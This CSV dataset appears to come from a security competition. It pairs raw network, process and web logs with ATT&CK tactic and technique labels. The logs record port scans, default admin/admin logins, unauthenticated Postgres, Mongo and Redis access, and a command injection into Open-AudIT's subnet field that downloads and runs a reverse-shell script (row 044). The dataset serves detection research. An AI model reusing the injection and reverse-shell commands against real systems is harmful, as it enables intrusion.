ID,Event,Tactic,Technique
2018_T02_035,"{""endtime"":""2018-11-03T18:03:03.635690Z"",""timestamp"":""2018-11-03T18:03:03.629356Z"",""bytes"":1338,""src_mac"":""42:01:0A:00:FE:C9"",""src_port"":56610,""bytes_in"":607,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":731,""time_taken"":6379,""transport"":""tcp"",""flow_id"":""712c0d58-c302-4f72-a25a-20c95c536f7d"",""src_ip"":""10.0.254.201"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node012kph4da2m9s8k0zt6locgnr62.node0"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_036,wget https://raw.githubusercontent.com/traccar/traccar/master/tools/test-commands.py,Pre-Attack,Pre-Attack
2018_T02_037,wget https://raw.githubusercontent.com/traccar/traccar/master/tools/test-trips.py,Pre-Attack,Pre-Attack
2018_T02_038,"{""endtime"":""2018-11-03T20:17:25.926376Z"",""timestamp"":""2018-11-03T20:17:25.919703Z"",""bytes"":1352,""src_mac"":""42:01:0A:00:FE:CA"",""src_port"":52352,""bytes_in"":602,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":750,""time_taken"":6695,""transport"":""tcp"",""flow_id"":""456a3dfd-6c88-483f-9541-7aeca9c1c091"",""src_ip"":""10.0.254.202"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node0icw5mntau2rf1efx9szmpb4ai3.node0"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_039,"{""endtime"":""2018-11-03T20:17:25.926949Z"",""timestamp"":""2018-11-03T20:17:25.920409Z"",""bytes"":1352,""src_mac"":""42:01:0A:00:01:01"",""src_port"":52352,""bytes_in"":602,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:01:2E"",""dest_port"":8082,""bytes_out"":750,""time_taken"":6645,""transport"":""tcp"",""flow_id"":""ca2ccf5b-628e-4d9f-a0eb-ec4ae8763c7a"",""src_ip"":""10.0.254.202"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":379,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node0icw5mntau2rf1efx9szmpb4ai3.node0"",""form_data"":""email=admin&password=admin&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_040,root 9703 1 15.5 00:00:01 1.1 88168 199376 pts/2 S 00:12 nmap -sV_-sS_-sC_10.0.0.0/24_-p-,Discovery,Network Service Scanning
2018_T02_041,"{""endtime"":""2018-11-03T14:00:24.866245Z"",""timestamp"":""2018-11-03T14:00:24.842154Z"",""bytes"":2439,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":38000,""bytes_in"":375,""dest_ip"":""10.0.0.23"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":2064,""time_taken"":24139,""transport"":""tcp"",""flow_id"":""88a87a4e-3dcd-4ff8-89d4-3b166cc392f5"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":1853,""http_content_type"":""text/html;charset=UTF-8"",""form_data"":""redirect_url=%2Fomk%2Fopen-audit"",""site"":""10.0.0.23"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.23/"",""server"":""Mojolicious (Perl)"",""status"":200,""uri_query"":""redirect_url=%2Fomk%2Fopen-audit"",""uri_path"":""/en/omk/open-audit/login"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T02_042,"{""endtime"":""2018-11-03T14:00:31.927072Z"",""timestamp"":""2018-11-03T14:00:31.901170Z"",""bytes"":2681,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":38018,""bytes_in"":558,""dest_ip"":""10.0.0.23"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":2123,""time_taken"":25925,""transport"":""tcp"",""flow_id"":""dadfb01e-710a-4b67-a73e-b36a40680823"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":1739,""http_content_type"":""text/html;charset=UTF-8"",""cookie"":""PHPSESSID=0mhv2b249jnn6unub45vuedpq5; omk=eyJhdXRoX2RhdGEiOiJhZG1pbiIsImV4cGlyZXMiOjE1NDEyNTcyMzF9--8886d39f504b156254b44c67eb6023e0b54ec6e2"",""site"":""10.0.0.23"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.23/en/omk/open-audit/login?redirect_url=%2Fomk%2Fopen-audit"",""server"":""Mojolicious (Perl)"",""status"":200,""uri_path"":""/en/omk/open-audit/license_upgrade"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T02_043,"{""endtime"":""2018-11-03T14:34:05.244619Z"",""timestamp"":""2018-11-03T14:34:04.686146Z"",""bytes"":8698,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":38462,""bytes_in"":545,""dest_ip"":""10.0.0.23"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":8153,""time_taken"":558505,""transport"":""tcp"",""flow_id"":""7f797dbc-704d-49fc-8d8a-068a3f523e00"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html;charset=UTF-8"",""cookie"":""PHPSESSID=0mhv2b249jnn6unub45vuedpq5; omk=eyJhdXRoX2RhdGEiOiJhZG1pbiIsImV4cGlyZXMiOjE1NDEyNTkyNDR9--57d5192f8f6941dbb48a5c6dfe98964168275e65"",""site"":""10.0.0.23"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.23/en/omk/open-audit/discoveries/create?single=y"",""server"":""Mojolicious (Perl)"",""status"":200,""uri_path"":""/en/omk/open-audit/discoveries/2"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_044,www-data 30735 0 0.0 00:00:00 0.0 816 4628 ? S 00:11 sh -c_nohup_/usr/local/open-audit/other/discover_subnet.sh_subnet_range=10.0.0.10_url=http://test.com;_wget_http://10.0.254.204:8000/tcp_pty_backconnect.py;_python_tcp_pty_backconnect.pyindex.php/input/discoveries_submit_online=y_echo_output=n_create_file=n_debugging=0_discovery_id=2_>_/dev/null_2>&1_&,"Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_045,"Connecting to 10.0.254.204:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 688 [text/plain] Saving to: 'tcp_pty_backconnect.py' 0K 100% 138M=0s 2018-11-03 14:31:45 (138 MB/s) - 'tcp_pty_backconnect.py' saved [688/688]",Lateral Movement,Remote File Copy
2018_T02_046,root 9703 1 15.5 00:00:01 1.1 88168 199376 pts/2 S 00:12 nmap -sV_-sS_-sC_10.0.0.0/24_-p-,Discovery,Network Service Scanning
2018_T02_047,"10.0.254.203 - - [03/Nov/2018:14:45:40 +0000] ""GET /nmaplowercheck1541256339 HTTP/1.1"" 200 4176 ""-"" ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)""",Discovery,Network Service Scanning
2018_T02_048,"{""endtime"":""2018-11-03T15:08:11.576607Z"",""timestamp"":""2018-11-03T15:08:11.569967Z"",""bytes"":2213,""src_mac"":""42:01:0A:00:FE:CB"",""src_port"":39590,""bytes_in"":326,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":1887,""time_taken"":6713,""transport"":""tcp"",""flow_id"":""03c6c968-6b8e-4ee7-b401-fbcdd5ccc8b1"",""src_ip"":""10.0.254.203"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.176/"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/about"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Discovery,Pre-Attack
2018_T02_049,"{""endtime"":""2018-11-03T15:08:23.686930Z"",""timestamp"":""2018-11-03T15:08:23.684710Z"",""bytes"":18686,""src_mac"":""42:01:0A:00:FE:CB"",""src_port"":39612,""bytes_in"":344,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":18342,""time_taken"":2242,""transport"":""tcp"",""flow_id"":""13bc9c70-ccd1-4e4f-9058-f33462ccbdba"",""src_ip"":""10.0.254.203"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":18013,""http_content_type"":""application/json; charset=UTF-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.176/about"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/public/apidoc.json"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T02_050,"{""endtime"":""2018-11-03T16:02:16.161990Z"",""timestamp"":""2018-11-03T16:02:16.157093Z"",""bytes"":2004,""src_mac"":""42:01:0A:00:FE:CD"",""src_port"":37642,""bytes_in"":298,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":1706,""time_taken"":4928,""transport"":""tcp"",""flow_id"":""012fd9be-12ee-45f4-acb9-901ae073ef47"",""src_ip"":""10.0.254.205"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/cmdlet"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_051,"{""endtime"":""2018-11-03T16:05:46.294424Z"",""timestamp"":""2018-11-03T16:05:46.287023Z"",""bytes"":848,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":53202,""bytes_in"":434,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":414,""time_taken"":7439,""transport"":""tcp"",""flow_id"":""f42ecfc2-e50a-4502-879e-7a628526af06"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":175,""http_content_type"":""application/json; charset=utf-8"",""form_data"":""cmd=ls"",""site"":""10.0.0.176"",""http_method"":""GET"",""http_referrer"":""http://10.0.0.176/users"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_query"":""cmd=ls"",""uri_path"":""/api/v1/cmdlet"",""http_user_agent"":""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0"",""protocol_stack"":""ip:tcp:http""}","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_052,"10.0.254.204 - - [03/Nov/2018:16:05:46 +0000] ""GET /api/v1/cmdlet?cmd=ls HTTP/1.1"" 200 175 ""http://10.0.0.176/users"" ""Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0""","Execution, Lateral Movement","Execution for client exploitation, Exploitation of Remote Services"
2018_T02_053,root 8246 1 28.7 00:00:03 1.2 94068 189784 pts/0 R 00:12 nmap -sS_-sV_-T5_-p-_10.0.1.0/24,Discovery,Network Service Scanning
2018_T02_054,"{""endtime"":""2018-11-03T14:32:38.263159Z"",""timestamp"":""2018-11-03T14:32:38.263133Z"",""bytes"":112,""src_ip"":""10.0.254.205"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":47105,""connection"":""10.0.1.51:5432"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.51"",""dest_mac"":""42:01:0A:00:01:33"",""dest_port"":5432,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":26,""flow_id"":""6a544b54-80d2-4fc5-8d99-1b8fbd3c6894"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T02_055,"Start-Date: 2018-11-03 21:47:53 Commandline: apt install pgcli Install: python3-terminaltables:amd64 (3.1.0-2, automatic), python3-setproctitle:amd64 (1.1.10-1+b2, automatic), python3-pgspecial:amd64 (1.9.0-1.1, automatic), python3-humanize:amd64 (0.5.1-2, automatic), python3-prompt-toolkit:amd64 (1.0.15-1, automatic), python3-tabulate:amd64 (0.8.2-1, automatic), python3-psycopg2:amd64 (2.7.5-2, automatic), python3-pygments:amd64 (2.2.0+dfsg-2, automatic), python3-wcwidth:amd64 (0.1.7+dfsg1-2, automatic), pgcli:amd64 (1.9.1-1), python3-sqlparse:amd64 (0.2.4-1, automatic)",Pre-Attack,Pre-Attack
2018_T02_056,root 6194 1 15.0 00:00:00 0.5 40248 166760 pts/7 S 00:03 python3 /usr/bin/pgcli_-h_10.0.1.51_-p_5432_-U_postgres,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_057,tcp 0 0 10.0.254.201:50480 10.0.1.51:5432 ESTAB,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_058,tcp 0 0 10.0.1.51:5432 10.0.254.201:50480 ESTAB,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_059,root 9703 1 15.5 00:00:01 1.1 88168 199376 pts/2 S 00:12 nmap -sV_-sS_-sC_10.0.0.0/24_-p-,Discovery,Network Service Scanning
2018_T02_060,"{""endtime"":""2018-11-03T14:02:48.561172Z"",""timestamp"":""2018-11-03T14:02:48.561131Z"",""bytes"":112,""src_ip"":""10.0.254.202"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":57487,""connection"":""10.0.0.24:1723"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.0.24"",""dest_mac"":""42:01:0A:00:00:18"",""dest_port"":1723,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":41,""flow_id"":""df9a584b-4582-4399-86ca-d0e2418f66a1"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T02_061,mongo 10.0.0.24,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_062,root 21294 1 0.2 00:00:00 0.4 36148 764528 pts/5 S 00:18 mongo 10.0.0.24,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_063,tcp 0 0 10.0.0.24:27017 10.0.254.201:58092 ESTAB,"Credential Access, Lateral Movement, Lateral Movement","Brute Force, Valid Accounts, Remote Services"
2018_T02_064,"node 13578 root cwd DIR 8,1 4096 2838531 /data/web/onramp ",Discovery,System Service Discovery
2018_T02_065,root 8246 1 28.7 00:00:03 1.2 94068 189784 pts/0 R 00:12 nmap -sS_-sV_-T5_-p-_10.0.1.0/24,"Discovery, Discovery","Network Service Scanning, Security Software Discovery"
2018_T02_066,"{""endtime"":""2018-11-03T14:32:13.619733Z"",""timestamp"":""2018-11-03T14:32:13.619677Z"",""bytes"":112,""src_ip"":""10.0.254.205"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":47105,""connection"":""10.0.1.40:443"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.40"",""dest_mac"":""42:01:0A:00:01:28"",""dest_port"":443,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":56,""flow_id"":""843aa5e9-0e32-4c93-b998-1cafb0a9f623"",""protocol_stack"":""""}","Discovery, Discovery","Network Service Scanning, Security Software Discovery"
2018_T02_067,"{""endtime"":""2018-11-03T14:32:13.620156Z"",""timestamp"":""2018-11-03T14:32:13.619998Z"",""bytes"":112,""src_ip"":""10.0.254.205"",""src_mac"":""42:01:0A:00:FE:CD"",""src_port"":47105,""connection"":""10.0.1.40:443"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.40"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":443,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":158,""flow_id"":""e8b2e816-2f9e-4165-9d2a-17738f2ce663"",""protocol_stack"":""""}","Discovery, Discovery","Network Service Scanning, Security Software Discovery"
2018_T05_001,root 9051 1 7.8 00:00:00 0.6 46284 65372 pts/1 T 00:05 nmap -sV_10.0.0.0/24_10.0.1.0/24_10.0.2.0/24,Discovery,Network Service Scanning
2018_T05_002,"{""endtime"":""2018-11-03T14:21:38.714724Z"",""timestamp"":""2018-11-03T14:21:38.700119Z"",""bytes"":129134,""src_mac"":""42:01:0A:00:00:01"",""src_port"":45588,""bytes_in"":667,""dest_ip"":""10.0.0.20"",""dest_mac"":""42:01:0A:00:00:14"",""dest_port"":3000,""bytes_out"":128467,""time_taken"":14738,""transport"":""tcp"",""flow_id"":""6379e4e9-a170-4890-99ff-85b331db36b3"",""src_ip"":""10.0.254.203"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""site"":""nationals-t5-corp-talk-00.c.security-competitions.internal:3000"",""http_method"":""POST"",""status"":200,""uri_path"":""/sdk"",""http_user_agent"":""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"",""protocol_stack"":""ip:tcp:http:soap""}",Discovery,Network Service Scanning
2018_T05_003,tcp 0 0 10.0.254.202:39858 10.0.0.20:27017 ESTAB,"Credential Access, Lateral Movement","Brute Force, Remote Services"
2018_T05_004,tcp 0 0 10.0.0.20:27017 10.0.254.202:39858 ESTAB,"Credential Access, Lateral Movement","Brute Force, Remote Services"
2018_T05_005,root 8012 1 0.2 00:00:00 0.4 33048 765000 pts/1 S 00:17 mongo 10.0.0.20,"Credential Access, Lateral Movement","Brute Force, Remote Services"
2018_T05_006,root 9051 1 7.8 00:00:00 0.6 46284 65372 pts/1 T 00:05 nmap -sV_10.0.0.0/24_10.0.1.0/24_10.0.2.0/24,Discovery,Network Service Scanning
2018_T05_007,"root 7238 0 0.7 00:00:04 1.1 91640 120060 pts/6 S 10:43 nmap -T4_-sV_-n_-sSU_-p_T:0-20,24,26-79,81-109,112-134,136,138,140-442,444,446-1432,1434-2048,2050-3305,3307-3388,3390-5431,5433-8079,8081-29999_10.0.1.0/24_-oA_/tmp/sparta-6mXy9z-running/nmap/20181103104238-nmapstage4",Discovery,Network Service Scanning
2018_T05_008,"{""timestamp"":""2018-11-03T14:54:05.360189+0000"",""flow_id"":1348455289945121,""in_iface"":""ens4"",""event_type"":""http"",""src_ip"":""10.0.254.201"",""src_port"":52810,""dest_ip"":""10.0.1.52"",""dest_port"":9851,""proto"":""TCP"",""tx_id"":0,""http"":{""url"":""\/"",""http_method"":""GET"",""protocol"":""HTTP\/1.0"",""length"":0}}",Discovery,Network Service Scanning
2018_T05_009,root 26720 0 6.4 00:00:00 0.6 49608 70284 pts/3 S 00:05 nmap -sV_-p9851_10.0.1.52,Discovery,Network Service Scanning
2018_T05_010,root 28321 1 12.1 00:00:00 0.6 49496 66220 pts/3 S 00:06 apt install_redis-tools,Pre-Attack,Pre-Attack
2018_T05_011,root 30345 0 0.0 00:00:00 0.0 2052 21120 pts/3 S 00:10 redis-cli -h_10.0.1.53_-p_9851,"Credential Access, Lateral Movement","Brute Force, Remote Services"
2018_T05_012,tcp 0 0 10.0.254.201:47172 10.0.1.52:9851 ESTAB,"Credential Access, Lateral Movement","Brute Force, Remote Services"
2018_T05_013,tcp 0 0 [::ffff:10.0.1.52]:9851 [::ffff:10.0.254.201]:47172 ESTAB,"Credential Access, Lateral Movement","Brute Force, Remote Services"
2018_T05_014,root 9051 1 7.8 00:00:00 0.6 46284 65372 pts/1 T 00:05 nmap -sV_10.0.0.0/24_10.0.1.0/24_10.0.2.0/24,Discovery,Network Service Scanning
2018_T05_015,"{""endtime"":""2018-11-03T14:34:24.391898Z"",""timestamp"":""2018-11-03T14:34:24.391838Z"",""bytes"":128,""src_ip"":""10.0.254.203"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":48066,""connection"":""10.0.1.51:23"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":74,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.51"",""dest_mac"":""42:01:0A:00:01:33"",""dest_port"":23,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":60,""flow_id"":""e546376c-370d-49bb-8962-34cbba4d6845"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T05_016,"{""endtime"":""2018-11-03T18:09:23.420662Z"",""timestamp"":""2018-11-03T18:09:23.414053Z"",""bytes"":128591,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":49632,""bytes_in"":142,""dest_ip"":""10.0.0.20"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":3000,""bytes_out"":128449,""time_taken"":6658,""transport"":""tcp"",""flow_id"":""e3c2b3b1-103c-41b0-8a2a-add2f8ceaf01"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_type"":""text/html; charset=utf-8"",""site"":""10.0.0.20"",""http_method"":""GET"",""status"":200,""uri_path"":""/.psql_history"",""http_user_agent"":""Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001535)"",""protocol_stack"":""ip:tcp:http""}","Discovery, Credential Access","Network Service Scanning, Credentials in Files"
2018_T05_017,root 26452 0 0.1 00:00:00 0.1 10764 43500 pts/3 S 00:18 psql -U_postgres_-h_10.0.1.51,"Credential Access, Lateral Movement, Lateral Movement,","Brute Force, Valid Accounts, Remote Services"
2018_T05_018,tcp 0 0 10.0.254.202:47614 10.0.1.51:5432 ESTAB,"Credential Access, Lateral Movement, Lateral Movement,","Brute Force, Valid Accounts, Remote Services"
2018_T05_019,root 9051 1 7.8 00:00:00 0.6 46284 65372 pts/1 T 00:05 nmap -sV_10.0.0.0/24_10.0.1.0/24_10.0.2.0/24,Discovery,Network Service Scanning
2018_T05_020,"{""endtime"":""2018-11-03T14:34:24.389977Z"",""timestamp"":""2018-11-03T14:34:24.389938Z"",""bytes"":128,""src_ip"":""10.0.254.203"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":36184,""connection"":""10.0.0.23:23"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":74,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.0.23"",""dest_mac"":""42:01:0A:00:00:17"",""dest_port"":23,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":39,""flow_id"":""e8ea0f89-b335-4704-866d-30470690550c"",""protocol_stack"":""""}",Discovery,Network Service Scanning
